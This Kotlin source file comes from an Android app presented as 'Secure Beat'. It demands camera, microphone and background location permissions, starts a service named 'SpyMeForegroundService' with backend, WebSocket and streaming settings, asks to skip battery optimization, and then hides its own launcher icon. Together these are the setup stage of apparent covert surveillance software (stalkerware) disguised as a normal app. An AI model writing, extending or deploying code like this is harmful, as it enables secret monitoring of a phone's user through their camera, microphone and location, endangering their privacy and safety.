package com.anonymous.scure_beat

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class PermissionHandlerActivity : Activity() {

    companion object {
        private const val TAG = "PermissionHandler"
        private const val PERMISSION_REQUEST_CODE = 1001
        private var isStartingService = false // ✅ Prevent multiple starts
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "📱 PermissionHandlerActivity created")

        // ✅ If service already running, just go home
        if (isServiceRunning()) {
            Log.i(TAG, "✅ Service already running, finishing...")
            goHome()
            return
        }

        checkAndRequestPermissions()
    }

    private fun isServiceRunning(): Boolean {
        try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val services = manager.getRunningServices(Integer.MAX_VALUE)
            return services.any { it.service.className == SpyMeForegroundService::class.java.name }
        } catch (e: Exception) {
            return false
        }
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.CAMERA)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) !=
                    PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (permissionsToRequest.isNotEmpty()) {
            Log.i(TAG, "🔑 Requesting ${permissionsToRequest.size} permissions")
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSION_REQUEST_CODE,
            )
        } else {
            Log.i(TAG, "✅ All permissions already granted")
            startSpyMeService()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }

            if (allGranted) {
                Log.i(TAG, "✅ All permissions granted!")
                startSpyMeService()
            } else {
                // ✅ Don't exit - show dialog to open settings
                val deniedPermissions = permissions.filterIndexed { index, _ ->
                    grantResults[index] != PackageManager.PERMISSION_GRANTED
                }

                val shouldShowRationale = deniedPermissions.any {
                    ActivityCompat.shouldShowRequestPermissionRationale(this, it)
                }

                if (!shouldShowRationale) {
                    // "Never ask again" - open settings
                    showSettingsDialog()
                } else {
                    // Just denied - retry
                    Toast.makeText(
                            this,
                            "Please grant all permissions to continue",
                            Toast.LENGTH_LONG,
                        )
                        .show()
                    Handler(Looper.getMainLooper())
                        .postDelayed({ checkAndRequestPermissions() }, 2000)
                }
            }
        }
    }

    private fun showSettingsDialog() {
        android.app.AlertDialog.Builder(this)
            .setTitle("⚠️ Permissions Required")
            .setMessage(
                "Please grant all permissions in Settings:\n\n" +
                    "1. Go to Settings → Apps → Secure Beat\n" +
                    "2. Tap Permissions\n" +
                    "3. Allow ALL permissions\n" +
                    "4. Return to this app"
            )
            .setCancelable(false)
            .setPositiveButton("Open Settings") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    Toast.makeText(this, "Please grant permissions manually", Toast.LENGTH_LONG)
                        .show()
                }
            }
            .setNegativeButton("Retry") { _, _ -> checkAndRequestPermissions() }
            .show()
    }

    private fun startSpyMeService() {
        // ✅ Prevent multiple starts
        if (isStartingService) {
            Log.w(TAG, "⚠️ Already starting service, skipping...")
            return
        }
        isStartingService = true

        Log.i(TAG, "🚀 Starting SpyMeForegroundService...")
        requestBatteryOptimization()

        val serviceIntent =
            Intent(this, SpyMeForegroundService::class.java).apply {
                putExtra("ROOM_ID", getSafeBuildConfig("ROOM_ID"))
                putExtra("TOKEN", getSafeBuildConfig("TOKEN"))
                putExtra("USERNAME", getSafeBuildConfig("USERNAME", "AndroidClient"))
                putExtra("BACKEND_URL", getSafeBuildConfig("BACKEND_URL"))
                putExtra("WS_URL", getSafeBuildConfig("WS_URL"))
                putExtra("ICE_SERVERS", getSafeBuildConfig("ICE_SERVERS", "[]"))
            }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "✅ Service started successfully")

            // ✅ Delay hiding icon to ensure service starts
            Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        hideAppIconForce()
                        goHome()
                    },
                    500,
                )
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start service", e)
            isStartingService = false
            Toast.makeText(this, "Service start failed, retrying...", Toast.LENGTH_SHORT).show()
            Handler(Looper.getMainLooper()).postDelayed({ startSpyMeService() }, 3000)
        }
    }

    private fun getSafeBuildConfig(key: String, default: String = ""): String {
        return try {
            val field = BuildConfig::class.java.getDeclaredField(key)
            field.isAccessible = true
            (field.get(null) as? String) ?: default
        } catch (e: Exception) {
            Log.w(TAG, "Failed to get BuildConfig.$key: ${e.message}")
            default
        }
    }

    private fun hideAppIconForce() {
        try {
            // ✅ ONLY disable LauncherAlias, NOT MainActivity
            val alias = ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )

            // ✅ DO NOT disable MainActivity - Expo needs it for debugging
            // MainActivity stays enabled

            // Refresh launcher
            try {
                val refreshIntent = Intent(Intent.ACTION_PACKAGE_CHANGED)
                refreshIntent.data = android.net.Uri.parse("package:$packageName")
                refreshIntent.putExtra(Intent.EXTRA_DONT_KILL_APP, true)
                sendBroadcast(refreshIntent)
            } catch (e: Exception) {
                /* ignore */
            }

            Log.i(TAG, "✅ Icon hidden (LauncherAlias disabled)")
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding icon: ${e.message}")
        }
    }

    private fun goHome() {
        Log.i(TAG, "🏠 Going home...")
        val homeIntent =
            Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
        startActivity(homeIntent)
        finish()
    }

    private fun requestBatteryOptimization(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val powerManager =
                    getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                    return true
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to request battery optimization: ${e.message}")
            }
        }
        return false
    }

    override fun onResume() {
        super.onResume()
        // ✅ When returning from Settings, check if permissions are now granted
        if (!isStartingService) {
            Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        if (isServiceRunning()) {
                            Log.i(TAG, "✅ Service running, finishing...")
                            goHome()
                            return@postDelayed
                        }
                        if (getMissingPermissions().isEmpty()) {
                            Log.i(TAG, "✅ Permissions granted, starting service...")
                            startSpyMeService()
                        }
                    },
                    500,
                )
        }
    }

    private fun getMissingPermissions(): List<String> {
        val missing = mutableListOf<String>()
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            missing.add(Manifest.permission.CAMERA)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            missing.add(Manifest.permission.RECORD_AUDIO)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            missing.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED
        ) {
            missing.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                missing.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) !=
                    PackageManager.PERMISSION_GRANTED
            ) {
                missing.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
        return missing
    }
}
